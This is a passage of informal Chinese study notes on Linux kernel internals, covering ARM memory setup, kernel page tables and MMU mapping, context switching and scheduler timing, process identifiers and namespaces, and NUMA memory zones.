              meminfo.bank[0].start = PHYS_OFFSET; 
              meminfo.bank[0].size = MEM_SIZE; 
          }
        ->内核内存空间管理
          每一个任务都有一个mm_struct结构管理其内存空间，init_mm 是内核的mm_struct。
          其中设置成员变量* mmap指向自己， 意味着内核只有一个内存管理结构，
          设置 pgd=swapper_pg_dir，swapper_pg_dir是内核的页目录，ARM体系结构的内核页目录大小定义为16k。
          init_mm定义了整个内核的内存空间，内核线程属于内核代码，同样使用内核空间，其访问内存空间的权限与内核一样。
          init_mm.start_code = (unsigned long) &_text; 内核代码段开始 
          init_mm.end_code = (unsigned long) &_etext; 内核代码段结束 
          init_mm.end_data = (unsigned long) &_edata; 内核数据段开始 
          init_mm.brk = (unsigned long) &_end; 内核数据段结束 
        ->内存结构初始化
          bootmem_init(&meminfo)函数根据meminfo进行内存结构初始化。
          bootmem_init(&meminfo)函数中调用reserve_node_zero(bootmap_pfn, bootmap_pages) 函数，
	  这个函数的作用是保留一部分内存使之不能被动态分配。
	  这些内存块包括：
          reserve_bootmem_node(pgdat, __pa(&_stext), &_end - &_stext); /*内核所占用地址空间*/ 
          reserve_bootmem_node(pgdat, bootmap_pfn<<PAGE_SHIFT, bootmap_pages<<PAGE_SHIFT) /*bootmem结构所占用地址空间*/
        ->创建内核页表 paging_init(&meminfo, mdesc) 
          只映射所有部分物理内存供内核进程使用
          这张内核页表是给硬件单元MMU使用的,
	  至于要使用一级页表还是多级页表映射是!!是硬件MMU决定的,例如9g25这个arm架构的MMU是执行二级页表映射的!!
          因为虚拟地址转物理地址是由硬件实现的!!所以kernal只是提供建立了的页表,地址转换还是由mmu来完成!!
	  由于打开了mmu后cpu只访问虚拟地址,所以所以物理地址都需要映射到虚拟地址后才可以使用,
          由于mpu各功能寄存器是物理地址的一部分,所以cpu访问这些地址时,也要通过往虚拟地址映射
          然而内核页表一般映射的是部分ddram物理内存地址,并不包含功能寄存器地址
          关于功能寄存器的访问后述
		    
Linux 简化了分段机制，使得虚拟地址与线性地址总是一致，因此，Linux的虚拟地址空间也为0～4G。
	Linux内核将这4G字节的空间分为两部分。将最高的 1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为“内核空间”。
	而将较低的3G字节（从虚拟地址 0x00000000到0xBFFFFFFF），供各个进程使用，称为“用户空间）。
	因为每个进程可以通过系统调用进入内核，因此，Linux内核由系统 内的所有进程共享。
	于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。
linux每个用户进程都有自己单独的页表,内核线程使用内核的页表!! 每个用户进程要转到内核态时,内核态的代码都是使用这同一个内核页表
	所以进程切换时,也要执行页表切换!!!
	内核页表地址存放在 swapper_pg_dir ,每个用户态进程创建的时候,都会将这个页表复制到自己进程的页表中,成为自己页表的一部分
	1g的内核虚拟内存空间里,有128mb空间 是高端内存,具体说,这个空间可以被操作临时映射所有的物理内存地址,即可以访问所有的物理地址 
打开与不打开MMU的区别:
	未打开前,cpu访问的是实际地址,打开以后,cpu访问的只有虚拟地址
mmu 与 硬件寄存器访问关系
	打开mmu以后,cpu访问的只有虚拟地址,mpu的硬件寄存器也需要要设置到页表上,即要把物理地址映射到物理地址上,才能被访问
	一块mpu的全局地址空间除了给各个硬件分配的寄存器,还完全容纳了ddram的所有地址空间
	开启了MMU后,所有全局地址都要经过映射才能被正确访问,即ddram地址和其他硬件寄存器地址都需要映射
	keinel初始化构建内核态页表时,映射的所谓1gb内核态空间指的仅仅是ddram物理内存,并未建立对硬件寄存器的映射
	硬件寄存器的映射是在具体驱动初始化时,修改内核态页表部分内容,即分配部分虚拟地址映射到硬件寄存器地址上
	一般内核访问寄存器操作顺序是
		 request_mem_region 申请-> ioremap 建立映射-> 寄存器操作 
		-> iounmap 解除映射-> release_mem_region 释放申请。
		本质就是修改内核页表,使一部分虚拟地址映射到功能寄存器上
		一般来说，申请和释放操作分别放在open和release函数内比较好
从linux的进程切换深入理解mmu 与 页表 
	上下文概念:
		操作系统管理很多进程的执行. 有些进程是来自各种程序、系统和应用程序的单独进程，而某些进程来自被分解为很多进程的应用或程序。
		当一个进程从内核中移出，另一个进程成为活动的, 这些进程之间便发生了上下文切换. 
		操作系统必须记录重启进程和启动新进程使之活动所需要的所有信息. 这些信息被称作上下文, 它描述了进程的现有状态, 
		进程上下文是进程执行活动全过程的静态描述, 
		当一个进程在执行时,CPU的所有寄存器中的值、进程的状态以及堆栈中的内容被称 为该进程的上下文。
		当内核需要切换到另一个进程时，它需要保存当前进程的 所有状态，即保存当前进程的上下文，
		以便在再次执行该进程时，能够必得到切换时的状态执行下去。
		在LINUX中，当前进程上下文均保存在进程的任务数据结构中。在发生中断时,内核就在被中断进程的上下文中，在内核态下执行中断服务例程。
		但同时会保留所有需要用到的资源，以便中继服务结束时能恢复被中断进程 的执行.
		进程的上下文信息包括:
			指向可执行文件的指针, 栈, 内存(数据段和堆), 进程状态, 优先级, 
			程序I/O的状态, 授予权限, 调度信息, 审计信息, 有关资源的信息(文件描述符和读/写指针), 
			有关事件和信号的信息, 寄存器组(栈指针, 指令计数器)等等, 诸如此类.
	用户进程:
		每个用户进程都已一张自己独有的内存页表,
		每个用户进程都有 用户态进程部分 和 内核态进程部分,
		所以每张用户进程页表都有两部分: 用户态页表部分 和 内核态页表部分, 相当于每个用户进程是拥有"4g内存"空间的
		其中 所有用户进程页表的 内核态页表部分 都是一模一样!!
		某时刻,进程要正在执行时,这张页表所在的物理地址是放在cp15寄存器的cr3里的,给MMU硬件模块使用
		当执行的是内核态进程而不是用户态进程时,使用的内核页表是一般是 最近一次的 用户进程页表的 内核态页表部分
		由于所有用户进程页表的 内核态页表部分 是一样的,所以其实内核态进程 使用的是指同一张内核页表
		对同一用户进程,用户态和内核态理解:
			内核态的进程访问处于内核数据段的栈，这个栈不同于用户态的进程所用的栈。
			用户态进程所用的栈，是在进程线性地址空间中；
			而内核栈是当进程从用户空间进入内核空间时，特权级发生变化，需要切换堆栈，那么内核空间中使用的就是这个内核栈。
			因为内核控制路径使用很少的栈空间，所以只需要几千个字节的内核态堆栈。
	内核进程:
		一般是某些系统管理进程
		只有 内核态进程部分
		使用的 内核页表 与 用户进程内核态页表部分 是一样的,
		所以,不管是 用户进程的内核态进程部分 还是 内核进程, 都使用同一个内核页表!!
		所以切换到内核进程时并不会执行换页表操作,因为内核进程只会访问页表的内核态页表部分!!!
	进程切换,
		切换的是用户进程 与 用户进程, 用户进程的页表直接换过来
		当 用户进程 换成 内核进程时,不用换页表,内核进程直接使用用户进程的 内核态页表部分
		当 内核进程 换成 内核进程时,不用换页表,内核进程沿用最近一次的用户进程的 内核态页表部分
		因为不管是 用户进程的内核态进程部分 还是 内核进程, 都使用同一个内核页表!!,所以根本就就不用换
	context_switch进程上下文切换
		context_switch 是进程调度的核心
		用户进程A执行时,当遇到中断等各手段通知执行进程切换的时候,会转向保存用户态进程的各种信息,
			然后转向 用户进程A的内核态进程部分,然后就在此执行context_switch 切换到其他进程!!!
		内核进程B执行时,当遇到中断等各手段通知执行进程切换的时候,会转向执行context_switch 切换到其他进程!!!
		注意要认为 context_switch只在 内核进程执行,也可以在 用户进程的内核态进程部分执行!!!!
		prepare_arch_switch切换前的准备工作
			在进程切换之前, 首先执行调用每个体系结构都必须定义的prepare_task_switch挂钩, 
			这使得内核执行特定于体系结构的代码, 为切换做事先准备. 
			大多数支持的体系结构都不需要该选项
		换页表:
			struct task_struct *next->mm		//新进程内存描述符(内存描述符包含进程页表信息)
			struct task_struct *next->active_mm	//新进程活动的内存描述符(内存描述符包含进程页表信息)
			struct task_struct *prev->mm		//旧进程内存描述符
			struct task_struct *prev->active_mm	//旧进程活动的内存描述符(内存描述符包含进程页表信息)
			用户进程->active_mm 是自己的内存描述符	(active_mm)是用来做标记用的!!!
			内核进程->active_mm 是变化的
			用户进程->mm 是自己的内存描述符
			内核进程->mm 是mull值
			用户进程 换成 内核进程, 内核进程 换成 内核进程时:
				由于内核进程使用最近用户进程页表的内核态页表部分,但是注意:
				所以实际并没有换页表的实际操作
				prev是用户进程,next是内核进程,那么next会用prev的 active_mm,即next用prev页表的内核态页表部分
				prev是内核进程,next是内核进程,那么next会用prev的 active_mm,即next用最近一次用户进程页表的内核态页表部分
					而prev的 active_mm 最后要变回null
			用户进程 换成 用户进程, 内核进程 换成 内核用户进程时:
				switch_mm(prev->active_mm, next->mm, next);
				道中涉及换页表的实际操作!!就是把页表的物理地址放到cp15
				load_cr3(next->mm->pgd);	//换页表到cp15 的 cr3
				load_mm_ldt(next->mm);		//应该是换到了next进程那保存了用户态进程部分各种信息的数据结构体
				注意pgd不是GDT!! (GDT IDT LDT)的概念后面分清楚!!!
			虽然换页表了,但是进程还没有被切换,但是由于还是在内核态工作,内核页表一样,所以能继续正常工作!!!
		switch_to
			最后用switch_to完成了进程的切换, 该函数切换了寄存器状态和栈, 
			执行环境的切换是在switch_to()中完成的, switch_to完成最终的进程切换，
			它保存原进程的所有寄存器信息，恢复新进程的所有寄存器信息，并执行新的进程
			即switch_to之前还是 prev进程,switch_to执行了后,便转到了next进程的switch_to后的内容
			就是prev会停在prev的switch_to函数里,next却从next的switch_函数返回出来了!!(真正完成了进程切换)
			即开始执行 next进程switch_to之后的代码
			而prev进程switch_to之后的代码只有在当前进程下一次被选择运行时才会执行
			在每个switch_to被调用的时候, prev和next指针位于各个进程的内核栈中, 
				prev指向了当前运行的进程, 而next指向了将要运行的下一个进程
			switch_to执行了以下操作:
				进程切换, 即esp的切换, 由于从esp可以找到进程的描述符
				硬件上下文切换, 设置ip寄存器的值, 并jmp到__switch_to函数
				堆栈的切换, 即ebp的切换, ebp是栈底指针, 它确定了当前用户空间属于哪个进程
			switch_to(prev, next, last) 有三个参数意义
				譬如有a,b,c,d 4个进程,有如下切换 a->b, b->d, d->b, b->c, c->d, d->a
				第一次切换 switch_to(a,b,last) 执行switch_to的时候是a进程,要切到b进程去,
				当真的切到b后,其实a进程停在了他自己的switch_to函数,就说这个 switch_to(a,b,last) 停住了
				但最后一次切换 switch_to(d,a,last)后,a进程从停在的他自己的switch_to函数动起来了,
				就说这个 switch_to(a,b,last) 又动起来了,然后这last记录了是由那个进程切回到a进程来,这里last=d
				系统为了告知调度器, a再次执行前的进程是d, 通过switch_to的last参数返回的prev指向d
				即prev也从a换成了d,即 prev=last=d,
		barrier路障同步
			从switch_to返回后,其实就已经活动在新的进程了,后面的这些函数都是新进程内核态里执行的,
			也可以这么想进程在switch_to停住的时候其实是被切换了,现在又从switch_to动起来并跳出,说明已经切换回来可以继续动!!!!
			重新动起来的第一件事是barrier()
			其实这个barrier()应该不需要的,但在编译器编译的时候起作用的,
			如果没有barrier()
			switch_to()后面就是finish_task_switch()了,
			但编译的时候,编译器的优化有可能把switch_to()和finish_task_switch()的执行步骤糅合一块
			因为编译器不能分辨这时进程切换的关键地方,反而他优化分析到,他们是个连续过程,以下的做法运行更快,执行文件更小
			先执行switch_to()几条命令后,又优先插入finish_task_switch()几条命令,然后再继续执行switch_to()几条命令
			这时万万不允许的,所以,编译的时候,一定要避免两者因为编译优化而指令穿插!!!!
			所以中间由 barrier 隔开
		finish_task_switch(prev)完成清理工作
			重新动起来的第二件事是finish_task_switch()
			处理转回来时,之前的被停住的进程的相关信息!!!
			比如说上述的  a->b, b->d, d->b, b->c, c->d, d->a
			最后转回到a时, 即switch_to(d,a,last)停住,switch_to(a,b,last)返回时,
			switch_to(a,b,last)的prev参数从本来指向a自己,变成了指向了d
			finish_task_switch(prev)是处理进程 d 的状态 信息, 
			比如说,a发现d进程已经处于TASK_DEAD状态,就释放d进程的TASK_STRUCT结构,即真正地删除了标识已结束的d进程!!!!
虽然上下文切换是两个进程间的切换核心,但是如何唤起进程切换是一个大问题!!
	意味如果唤起进程切换 的是在 内核进程中运行, 那又是如何唤起进程切换先进入这个所谓的内核进程呢?是一个死结问题
	若是kernel的中断程序唤起进程切换,那这个中断程序是属于哪个进程呢?
	如果中断不属于任何进程,那又是如何做到让现在进程停下手上工作,突然间开始切换到新进程的内核态代码区?
进程调度切换只有一个方法: schedule()->context_switch()
	schedule()->context_switch()在切换动作前运行在 prev进程,
	在切换动作后,schedule()->context_switch()的收尾指令运行在 next进程
主调度器(核心调度器):
	指进程主动调用schedule()
	schedule()是在当前执行中德尔进程执行的,直至切换到别的进程.并不是在某个特定的内核进程的执行两个进程的调度
	context_switch()是schedule()的核心内容
周期调度器(通用调度器):周期性机制,
	定时中断,中断时,cpu从user_mode 进入irq_mode ,执行定时中断函数
	(其实就是本来cpu运行在user_mode的寄存器组,中断后,转到irq_mode寄存器组上工作,user_mode的寄存器组被冻结在当前状态)
	定时中断函数先 保存当前cpu在user_mode下执行的进程(例如进程A)的进度以及上下文,即被冻结的user_mode的寄存器组相关内容会被包存起来
		然后给进程A插入一段ret_from_sys_call（）内容,即改写user_mode的寄存器组内容,
		使得中断函数结束返回后,cpu回到user_mode,进程A不会继续之前的内容,而是先执行ret_from_sys_call（）后再执行之前的内容
	注意:
		我们之前一直谈论的 用户进程 ,内核进程 指的是 cpu工作在user_mode的寄存器组时 做进程的划分,
		当cpu工作在irq_mode的寄存器组时,这时执行的只是中断函数,并没有什么进程划分,并不属于上面的用户进程,内核进程任一方,
		即 scheduler_tick() 是在中断函数中执行的, 不是在某个 内核进程 或者 用户进程里执行
	scheduler_tick() 会分析当前cpu从user_mode下执行的进程(例如进程A)是不是要进行调度了!!!
		如果是,则在进程A的数据结构上标记相关内容 这叫激发延迟调度
	中断函数结束返回后,cpu回到user_mode执行进程A,进程A不会继续之前的内容,会先执行ret_from_sys_call（）
		ret_from_sys_call（）如果检测相关标记,就会执行 schedule()->context_switch() 切换掉进程A,
		假若进程A真被切换掉了,进程A会停在ret_from_sys_call（）->schedule()->context_switch()
		后面,进程A被切换回来重新运行,会先从ret_from_sys_call（）返回,然后回到之前被定时中断函数打断的地方执行!!!
	调用关系:
	static irqreturn_t ioc_timer_interrupt(int irq, void *dev_id)		(arch/arm/mach-rpc) 所以timer_tick应该没有用到
	    ->void timer_tick(void)			(arch/arm/kernel)
	        ->update_process_times(int user_tick)	
	            ->scheduler_tick();
	void tick_set_periodic_handler(struct clock_event_device *dev, int broadcast)
	    ->void tick_handle_periodic(struct clock_event_device *dev)
	        ->static void tick_periodic(int cpu)	(kernel/time)
	            ->update_process_times(int user_tick)	
	                ->scheduler_tick();
	void tick_setup_sched_timer(void)
	    ->static enum hrtimer_restart tick_sched_timer(struct hrtimer *timer)
	        ->static void tick_sched_handle(struct tick_sched *ts, struct pt_regs *regs)	(kernel/time)
	            ->update_process_times(int user_tick)	
	                ->scheduler_tick();
	int tick_check_oneshot_change(int allow_nohz)
	    static void tick_nohz_switch_to_nohz(void)
	        static void tick_nohz_handler(struct clock_event_device *dev)
	            ->static void tick_sched_handle(struct tick_sched *ts, struct pt_regs *regs)	(kernel/time)
	                ->update_process_times(int user_tick)	
	                    ->scheduler_tick();

未整理的网络参考: https://zhidao.baidu.com/question/756077885634341164.html
Linux在众多进程中是怎么进行调度的，这个牵涉到Linux进程调度时机的概念，由Linux内核中Schedule（）的函数来决定是否要进行进程的切换，
如果要切换的话，切换到哪个进程等等。
Linux进程调度时机主要有：
1、进程状态转换的时刻：进程终止、进程睡眠；
2、当前进程的时间片用完时（current->counter=0）；
3、设备驱动程序
4、进程从中断、异常及系统调用返回到用户态时；
时机1，进程要调用sleep（）或exit（）等函数进行状态转换，这些函数会主动调用调度程序进行进程调度；
时机2，由于进程的时间片是由时钟中断来更新的，因此，这种情况和时机4是一样的。
时机3，当设备驱动程序执行长而重复的任务时，直接调用调度程序。在每次反复循环中，驱动程序都检查need_resched的值，
	如果必要，则调用调度程序schedule()主动放弃CPU。
时机4，如前所述，不管是从中断、异常还是系统调用返回，最终都调用ret_from_sys_call（），由这个函数进行调度标志的检测，
	如果必要，则调用调用调度程序。那么，为什么从系统调用返回时要调用调度程序呢？这当然是从效率考虑。
	从系统调用返回意味着要离开内核态而返回到用户态，而状态的转换要花费一定的时间，因此，在返回到用户态前，系统把在内核态该处理的事全部做完。
对于直接执行调度程序的时机，我们不讨论，因为后面我们将会描述调度程序的工作过程。前面我们讨论了时钟中断，知道了时钟中断的重要作用，
	下面我们就简单看一下每个时钟中断发生时内核要做的工作，首先对这个最频繁的调度时机有一个大体了解，然后再详细讨论调度程序的具体工作过程。
每个时钟中断（timer interrupt）发生时，由三个函数协同工作，共同完成进程的选择和切换，
	它们是：schedule（）、do_timer（）及ret_form_sys_call（）。我们先来解释一下这三个函数：
schedule（）：进程调度函数，由它来完成进程的选择（调度）；
do_timer（）：暂且称之为时钟函数，该函数在时钟中断服务程序中被调用，是时钟中断服务程序的主要组成部分，
	该函数被调用的频率就是时钟中断的频率即每秒钟100次（简称100赫兹或100Hz）；
ret_from_sys_call（）：系统调用返回函数。当一个系统调用或中断完成时，该函数被调用，用于处理一些收尾工作，例如信号处理、核心任务等等。
这三个函数是如何协调工作的呢？
前面我们看到，时钟中断是一个中断服务程序，它的主要组成部分就是时钟函数do_timer（），
	由这个函数完成系统时间的更新、进程时间片的更新等工作，更新后的进程时间片counter作为调度的主要依据。
在时钟中断返回时，要调用函数ret_from_sys_call（），前面我们已经讨论过这个函数，在这个函数中有如下几行：
cmpl $0, _need_resched
jne reschedule
……
restore_all:
RESTORE_ALL

reschedule:
call SYMBOL_NAME(schedule)
jmp ret_from_sys_call

这几行的意思很明显：检测 need_resched 标志，如果此标志为非0，那么就转到reschedule处调用调度程序schedule（）进行进程的选择。
	调度程序schedule（）会根据具体的标准在运行队列中选择下一个应该运行的进程。当从调度程序返回时，如果发现又有调度标志被设置，
	则又调用调度程序，直到调度标志为0，这时，从调度程序返回时由RESTORE_ALL恢复被选定进程的环境，返回到被选定进程的用户空间，使之得到运行。
以上就是时钟中断这个最频繁的调度时机。讨论这个的主要目的使读者对时机4有个大致的了解。
另外，TIF_NEED_RESCHED的设置时机 :
设置这个标志的函数主要有两个: resched_task(),set_tsk_need_resched().主要是resched_task,
	而resched_task的调用者 check_preempt_curr更是通过:try_to_wake_up/wake_up_new_task/pull_task /__migrate_task 
	这些被广泛使用的函数, 从而分布在内核中大量的检查点有机会抢占进程.
最后要说明的是，系统调用返回函数ret_from_sys_call（）是从系统调用、异常及中断返回函数通常要调用的函数，
	但并不是非得调用，对于那些要经常被响应的和要被尽快处理的中断请求信号，为了减少系统开销，
	处理完成后并不调用 ret_from_sys_call（）（因为很显然的，从这些中断处理程序返回到的用户空间肯定是那个被中断的进程，无需重新选择），
	并且，它们作的工作要尽可能少，因为响应的频率太高了。
Linux进程调度和其他的UNIX进程调度不同，尤其是在“nice level”优先级的处理上，与优先权调度（priority高的进程最先运行）不同，
	Linux用的是时间片轮转调度（Round Robing），但同时又保证了高优先级的进程运行的既快、时间又长（both sooner and longer）。
	而标准的UNIX调度程序都用到了多级进程队列。大多数的实现都用到了二级优先队列：一个标准队列和一个实时（“real time”）队列。
	一般情况下，如果实时队列中的进程未被阻塞，它们都要在标准队列中的进程之前被执行，并且，每个队列中，“nice level”高的进程先被执行。
总体上，Linux 调度序程在交互性方面表现很出色，当然了，这是以牺牲一部分“吞吐量”为代价的。 

扩展内容 cache:
机子启动时会先把所有cache关闭,因为这时的cache存蓄随机数据,如果不关,根据cache的工作原理分析,机子运作可能会失败
在一个处理器系统中，指令Cache与数据Cache的组成方式和使用规则有所不同。
在现代处理器系统中，在L1 Cache层面，指令Cache与数据Cache通常分离，
而在其后的Cache层次中，指令与数据混合存放，在多数情况下L1指令Cache是只读的，
因此Cache Block中包含的状态较少一些，一致性处理相对较为简单









20170808
进程深入学习:
	esp寄存器是CPU栈指针
	namespace 是只使用一个内核在一台物理计算机上运作，前述的所有全局资源都通过命名空间抽象起来。
		  这使得可以将一组进程放置到容器中，各个容器彼此隔离。
		  本质上，命名空间建立了系统的不同视图。此前的每一项全局资源都必须包装到容器数据结构中，
		  只有资源和包含资源的命名空间构成的二元组仍然是全局唯一的。虽然在给定容器内部资源是自足的，但无法提供在容器外部具有唯一性的ID
		  这意义相当于 让同一台电脑,同时间运行多个个各自独立的linux系统,互相隔离,互不影响
		  一个进程有多个pid 分别属于多个namespace
	 各种相关id:
	 	PID 内核唯一区分每个进程的标识
			pid是 Linux 中在其命名空间中唯一标识进程而分配给它的一个号码，称做进程ID号，简称PID。
			在使用 fork 或 clone 系统调用时产生的进程均会由内核分配一个新的唯一的PID值
			这个pid用于内核唯一的区分每个进程
			注意它并不是我们用户空间通过getpid( )所获取到的那个进程号，至于原因么，接着往下看
		TGID 线程组（轻量级进程组）的ID标识
			在一个进程中，如果以CLONE_THREAD标志来调用clone建立的进程就是该进程的一个线程
			（即轻量级进程，Linux其实没有严格的进程概念），它们处于一个线程组，
			该线程组的所有线程的ID叫做TGID。处于相同的线程组中的所有进程都有相同的TGID，
			但是由于他们是不同的进程，因此其pid各不相同；线程组组长（也叫主线程）的TGID与其PID相同；
			一个进程没有使用线程，则其TGID与PID也相同。
			该进程的线程描述符。在linux内核中对线程并没有做特殊的处理，还是由task_struct来管理。
			所以从内核的角度看， 用户态的线程本质上还是一个进程。
			对于同一个进程（用户态角度）中不同的线程其tgid是相同的，但是pid各不相同。 
			主线程即group_leader（主线程会创建其他所有的子线程）。如果是单线程进程（用户态角度），它的pid等于tgid。
		PGID
			另外，独立的进程可以组成进程组（使用setpgrp系统调用），进程组可以简化向所有组内进程发送信号的操作
			例如用管道连接的进程处在同一进程组内。进程组ID叫做PGID，进程组内的所有进程都有相同的PGID，等于该组组长的PID。
		SID
			几个进程组可以合并成一个会话组（使用setsid系统调用），可以用于终端程序设计。
			会话组中所有进程都有相同的SID,保存在task_struct的session成员中
		全局ID 在内核本身和初始命名空间中唯一的ID，在系统启动期间开始的 init 进程即属于该初始命名空间。
			系统中每个进程都对应了该命名空间的一个PID，叫全局ID，保证在整个系统中唯一。
			全局PID和TGID直接保存在task_struct中，分别是task_struct的pid和tgid成员：
		局部ID 对于属于某个特定的命名空间，它在其命名空间内分配的ID为局部ID，该ID也可以出现在其他的命名空间中。
		struct task_struct -> nsproxy 	指针指向namespace相关的域，通过nsproxy域可以知道该task_struct属于哪个pid_namespace
	#如何快速地根据局部ID、命名空间、ID类型找到对应进程的 task_struct
		pid_hash[]
		这是一个hash表的结构，根据pid的nr值哈希到其某个表项，若有多个 pid 结构对应到同一个表项，这里解决冲突使用的是散列表法。
		这样，就能解决开始提出的第2个问题了，根据PID值怎样快速地找到task_struct结构体：
		首先通过 PID 计算 pid 挂接到哈希表 pid_hash[] 的表项
		遍历该表项，找到 pid 结构体中 nr 值与 PID 值相同的那个 pid
		再通过该 pid 结构体的 tasks 指针找到 node
		最后根据内核的 container_of 机制就能找到 task_struct 结构体
	#如何快速地给新进程在可见的命名空间内分配一个唯一的 PID
		pid_map
		这是一个位图，用来唯一分配PID值的结构，图中灰色表示已经分配过的值，在新建一个进程时，
		只需在其中找到一个为分配过的值赋给 pid 结构体的 nr，再将pid_map 中该值设为已分配标志。
		这也就解决了上面的第3个问题——如何快速地分配一个全局的PID
		至于上面的**第1个问题*就更加简单，已知 task_struct 结构体，根据其 pid_link 的 pid 指针找到 pid 结构体，取出其 nr 即为 PID 号。
	linux线程与进程区别!!!
		我们在区分Linux进程类别, 但是我还是想说Linux下只有一种类型的进程，那就是task_struct，
		当然我也想说linux其实也没有线程的概念, 只是将那些与其他进程共享资源的进程称之为线程
		Linux下线程其实上是与其他进程共享某些资源的进程而已。但是我们习惯上还是称他们为线程或者轻量级进程
		Linux上进程分3种，内核线程（或者叫核心进程）、用户进程、用户线程, 当然如果更严谨的，你也可以认为用户进程和用户线程都是用户进程
		这里的线程不是我们印象中多cpu并行执行的线程
	Linux下有3个特殊的进程，idle进程($PID = 0$), init进程($PID = 1$)和kthreadd($PID = 2$)
		idle进程由系统自动创建, 运行在内核态 idle进程其pid=0，其前身是系统创建的第一个进程，
			也是唯一一个没有通过fork或者kernel_thread产生的进程
		0号进程创建1号进程的方式如下 :kernel_thread(kernel_init, NULL, CLONE_FS);
			随后，1号进程调用do_execve运行可执行程序init，并演变成用户态1号进程，即init进程。	
		1号进程的执行函数就是kernel_init, 这个函数被定义init/main.c中
		由0号进程创建1号进程（内核态），1号内核线程负责执行内核的部分初始化工作及进行系统配置，
			并创建若干个用于高速缓存和虚拟主存管理的内核线程。
		kthreadd: 是其他内核线程的建造者. 
			内核线程其实就是上述区分说明的内核进程,由于共用资源的关系,所以属于linux线程的定义,所以也叫内核线程
			ps -eo pid,ppid,command		//查看当前存在的进程
			以下显示 其中一部分 的内核内核线程
			  PID  PPID COMMAND
			    1     0 /sbin/init
			    2     0 [kthreadd]
			    3     2 [ksoftirqd/0]
			    5     2 [kworker/0:0H]
			    7     2 [rcu_sched]
			    8     2 [rcu_bh]
			    9     2 [rcuos/0]
			   10     2 [rcuob/0]
			   11     2 [migration/0]
			   12     2 [watchdog/0]
			   13     2 [watchdog/1]
			   14     2 [migration/1]
			   15     2 [ksoftirqd/1]
			   17     2 [kworker/1:0H]
			   18     2 [rcuos/1]
			   19     2 [rcuob/1]
			   20     2 [watchdog/2]
			   21     2 [migration/2]
			   22     2 [ksoftirqd/2]
			   24     2 [kworker/2:0H]
			   25     2 [rcuos/2]
			   26     2 [rcuob/2]
			   27     2 [watchdog/3]
			   28     2 [migration/3]
			   29     2 [ksoftirqd/3]	
	系统调用:
		实现与C库不同, 普通C函数通过将参数的值压入到进程的栈中进行参数的传递。
		由于系统调用是通过中断进程从用户态到内核态的一种特殊的函数调用，
		没有用户态或者内核态的堆栈可以被用来在调用函数和被调函数之间进行参数传递。
		系统调用通过CPU的寄存器来进行参数传递。在进行系统调用之前，系统调用的参数被写入CPU的寄存器，
		而在实际调用系统服务例程之前，内核将CPU寄存器的内容拷贝到内核堆栈中，实现参数的传递。
		即不同的体系结构可能需要采用不同的方式或者寄存器来存储函数调用的参数， 
		因此linux在设计系统调用的时候, 将其划分成体系结构相关的层次和体系结构无关的层次, 
		前者复杂提取出依赖与体系结构的特定的参数， 后者则依据参数的设置执行特定的真正操作
	thread_info结构:
		除了thread信息外,还紧贴着一个内核栈,一般加起来共8k空间
	do_fork:
		只是复制出一个新的进程
	do_execve:
		替换进程里的程序内容,使进程执行被设计的程序内容!!
	ELF:
		代表Executable and Linkable Format。他是一种可执行文件、目标文件和库使用的文件格式。
memory深入学习:(内核内存分配管理)
	服务器系统架构来看，目前的商用服务器大体可以分为三类
		对称多处理器结构(SMP：Symmetric Multi-Processor):
			多cpu 共享统一硬盘,内存,各类I/O
		非一致存储访问结构(NUMA：Non-Uniform Memory Access):
			安排每个cpu都有自己的硬盘,内存,各类I/O,访问速度快,每个cpu也可以直接访问其他cpu的资源,但是访问速度慢
		海量并行处理结构(MPP：Massive Parallel Processing):
			多个SMP并联,每个smp之间通讯通过特定协议!!
	共享存储型多处理机有两种模型
		均匀存储器存取（Uniform-Memory-Access，简称UMA）模型:
			传统的多核运算是使用SMP(Symmetric Multi-Processor )模式：将多个处理器与一个集中的存储器和I/O总线相连。
			所有处理器只能访问同一个物理存储器，因此SMP系统有时也被称为一致存储器访问（UMA）结构体系，
			一致性意指无论在什么时候，处理器只能为内存的每个数据保持或共享唯一一个数值
		非均匀存储器存取（Nonuniform-Memory-Access，简称NUMA）模型
			NUMA模式是一种分布式存储器访问方式，处理器可以同时访问不同的存储器地址，大幅度提高并行性。 
			NUMA总是多处理器计算机,系统的哪个CPU都有本地内存, 可支持快速的访问, 各个处理器之前通过总线链接起来, 
			以支持堆其他CPU的本地内存的访问, 当然访问要比本地内存慢.
	linux 的内存机构,使用的是 NUMA
		处理器被划分成多个"节点"(node), 每个节点被分配有的本地存储器空间. 所有节点中的处理器都可以访问全部的系统物理存储器，
		但是访问本节点内的存储器所需要的时间，比访问某些远程节点内的存储器所花的时间要少得多
		按道理,每个 node 对应 一个cpu!!
		内存被分割成多个区域（BANK，也叫"簇"），依据簇与处理器的"距离"不同, 访问不同簇的代码也会不同. 
		比如，可能把内存的一个簇指派给每个处理器，或则某个簇和设备卡很近，很适合DMA，那么就指派给该设备。
		因此当前的多数系统会把内存系统分割成2块区域，一块是专门给CPU去访问，一块是给外围设备板卡的DMA去访问
		注意:
			linux 的内存机构基于 NUMA ,但是兼容 SMP系统架构及对应的UMA, 像以下方式兼容：
    			SMP多cpu 看做成一个cpu组,
			在UMA系统中, 内存就相当于一个只使用一个NUMA节点来管理整个系统的内存. 
			而内存管理的其他地方则认为他们就是在处理一个(伪)NUMA系统.
		Linux把物理内存划分为三个层次来管理:
			存储节点(Node): 	
				CPU被划分为多个节点(node), 内存则被分簇, 每个CPU对应一个本地物理内存, 
				即一个CPU-node对应一个内存簇bank，即每个内存簇被认为是一个节点
				用pd_data_t描述内存节点node
			管理区(Zone):
				每个物理内存节点node被划分为多个内存管理区域, 用于表示不同范围的内存, 内核可以使用不同的映射方式映射物理内存
				一个管理区(zone)由struct zone结构体来描述
			页面(Page):
				内存被细分为多个页面帧, 页面是最基本的页面分配的单位
	管理区(Zone):
		zone:讨论的是 内核虚拟地址空间分配,不包括用户空间的分配与使内容
		对于典型x86机器，管理区(内存区域)类型如下分布
			类型 		区域
			ZONE_DMA 	0~15MB
			ZONE_NORMAL 	16MB~895MB
			ZONE_HIGHMEM 	896MB~物理内存结束
			而由于32位系统中, Linux内核虚拟地址空间只有 1G, 而0~895M这个986MB被用于DMA和直接映射, 
			剩余的物理内存被成为高端内存. 那内核是如何借助剩余128MB高端内存地址空间是如何实现访问可以所有物理内存？
		高端内存:
			当内核想访问高于896MB物理地址内存时，从0xF8000000 ~ 0xFFFFFFFF地址空间范围内找一段相应大小空闲的逻辑地址空间，
